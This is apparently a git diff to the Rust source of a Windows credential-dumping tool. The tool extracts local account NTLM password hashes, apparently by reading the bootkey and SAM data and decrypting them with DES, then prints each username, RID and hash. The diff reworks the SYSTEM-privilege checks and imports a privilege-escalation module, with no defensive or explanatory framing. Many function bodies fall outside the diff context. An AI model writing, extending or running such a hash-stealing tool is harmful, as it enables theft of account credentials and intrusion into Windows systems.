@@ -1,5 +1,10 @@
 extern crate des;
 
+use crate::{
+    utilities::Utils,
+    privilege::Escalation,
+};
+
 use des::decrypt;
 
 pub mod powershell_command;
@@ -36,20 +41,26 @@ pub struct Ntlm {
 
 impl Ntlm {
     pub fn grab() -> Result<()> {
-        println!("[?] Please make sure to run this program as SYSTEM");
-        if !check_if_system() {
-            println!("[-] Program not running as SYSTEM");
-            std::process::exit(0);
-        }
-        println!("[+] Program is running as SYSTEM\n");
-
-        if let Ok(ntlms) = get_ntlm_hash() {
-            for ntlm in ntlms {
-                println!("{}::{}::{}", ntlm.username, ntlm.rid, ntlm.hash);
+        if !Utils::is_elevated() {
+            println!("[-] Program requires atleast system permissions");
+        } else {
+            if Utils::is_system() {
+                if let Ok(ntlms) = get_ntlm_hash() {
+                    for ntlm in ntlms {
+                        println!("{}::{}::{}", ntlm.username, ntlm.rid, ntlm.hash);
+                    }
+                }
             }
-        } 
+        }
         Ok(())
     }
+}
+
+fn get_executable_path() -> String {
+    match std::env::current_exe() {
+        Ok(path) => return path.display().to_string(),
+        Err(e) => return e.to_string(),
+    };
 }
 
 fn get_bootkey(input: String) -> Result<Vec<u8>> {
@@ -123,17 +134,6 @@ fn get_users() -> Result<Vec<String>> {
         }
     }
     Ok(users_vector)
-}
-
-fn get_current_username() -> String {
-    return whoami::realname();
-}
-
-fn check_if_system() -> bool {
-    if get_current_username().to_lowercase() == "system" {
-        return true;
-    }
-    return false;
 }
 
 fn collect_f_bytes() -> Result<Vec<u8>> {
